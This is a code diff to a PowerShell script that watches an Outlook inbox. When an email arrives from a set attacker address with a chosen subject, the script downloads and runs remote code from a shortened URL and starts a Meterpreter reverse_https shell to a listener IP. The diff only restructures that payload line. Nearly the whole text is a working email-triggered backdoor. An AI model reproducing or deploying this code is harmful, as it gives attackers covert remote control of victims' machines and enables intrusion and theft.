@@ -5,7 +5,10 @@ $ns = $outlook.GetNameSpace("MAPI");
 $inbox = $ns.GetDefaultFolder($olFolderInbox)
 $inbox.items | foreach { 
 if($_.SenderEmailAddress -match "ATTACKER@EMAILADDRESS.COM" -and $_.subject -match "CUSTOMSUBJECT")
-{IEX ((New-Object Net.WebClient).DownloadString('http://goo.gl/yfLfQB')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost xxx.xxx.x.xxx -Lport 1111 -Force}
+{$WebClientObject = New-Object Net.WebClient
+IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
+Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST 10.0.0.13 -LPORT 1111 -Force
+Return}
   
 }
 start-sleep -s 10  
